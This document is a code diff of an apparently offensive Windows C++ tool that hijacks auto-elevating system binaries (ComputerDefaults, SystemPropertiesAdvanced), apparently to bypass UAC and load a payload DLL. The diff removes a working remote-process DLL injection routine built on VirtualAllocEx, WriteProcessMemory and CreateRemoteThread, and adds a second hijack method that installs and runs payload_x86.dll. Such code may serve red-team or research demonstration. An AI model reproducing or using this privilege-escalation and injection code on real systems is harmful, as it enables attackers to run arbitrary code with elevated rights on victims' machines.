@@ -2,46 +2,16 @@
 //
 
 #include "pch.h"
-#include "ComputerDefaultsHijacker.h"
-#include <winternl.h>
 
-#define DLL_PAYLOAD_X86_PATH L"%USERPROFILE%\\Desktop\\Demo_PE\\payload_x86.dll"
-#define RUNDLL32_PATH L"%WinDir%\\system32\\rundll32.exe"
-#define DLL_PAYLOAD_ENTRY_POINT L"EntryPoint"
-
+//#define DLL_PAYLOAD_X86_PATH L"%USERPROFILE%\\Desktop\\Demo_PE\\payload_x86.dll"
+//#define RUNDLL32_PATH L"%WinDir%\\system32\\rundll32.exe"
+//#define DLL_PAYLOAD_ENTRY_POINT L"EntryPoint"
+#define DLL_NAME_X86 L"payload_x86.dll"
 
 
 #include <Shlwapi.h>
-#include <tlhelp32.h>
 #pragma comment (lib, "Shlwapi")
 
-BOOL loadRemoteDLL(DWORD pid, const char* dllPath)
-{
-	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-	
-	// Allocate memory for DLL's path name to remote process
-	LPVOID dllPathAddressInRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(dllPath), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-	if (dllPathAddressInRemoteMemory == NULL)
-		return FALSE;
-
-	// Write DLL's path name to remote process
-	BOOL succeededWriting = WriteProcessMemory(hProcess, dllPathAddressInRemoteMemory, dllPath, strlen(dllPath), NULL);
-
-	if (!succeededWriting)
-		return FALSE;
-
-	// Returns a pointer to the LoadLibrary address. This will be the same on the remote process as in our current process.
-	LPVOID loadLibraryAddress = (LPVOID)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");
-	if (loadLibraryAddress == NULL)
-		return FALSE;
-
-	HANDLE remoteThread = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)loadLibraryAddress, dllPathAddressInRemoteMemory, NULL, NULL);
-	if (remoteThread == NULL)
-		return FALSE;
-
-	CloseHandle(hProcess);
-	return TRUE;
-}
 
 int wmain(int argc, wchar_t* argv[])
 {
@@ -74,7 +44,7 @@ int wmain(int argc, wchar_t* argv[])
 	 * ====================================================
 	 */
 
-	if (method == Method::ComputerDefaults)
+	if (Method::ComputerDefaults == method)
 	{
 		ComputerDefaultsHijacker hijacker;
 
@@ -86,6 +56,23 @@ int wmain(int argc, wchar_t* argv[])
 		else
 			hijacker.Uninstall();
 	}
+	if (Method::SystemPropertiesAdvanced == method)
+	{
+		SystemPropertiesAdvancedHijacker hijacker;
+
+		if (bInstall)
+		{
+			WCHAR wzDllPath[MAX_PATH];
+			GetCurrentDirectoryW(_countof(wzDllPath), wzDllPath);
+			PathAppendW(wzDllPath, DLL_NAME_X86);
+			
+			hijacker.Install(wzDllPath, wzCommandLine);
+			hijacker.Run();
+		}
+		else
+			hijacker.Uninstall();
+	}
+
 
 	
 	return 0;
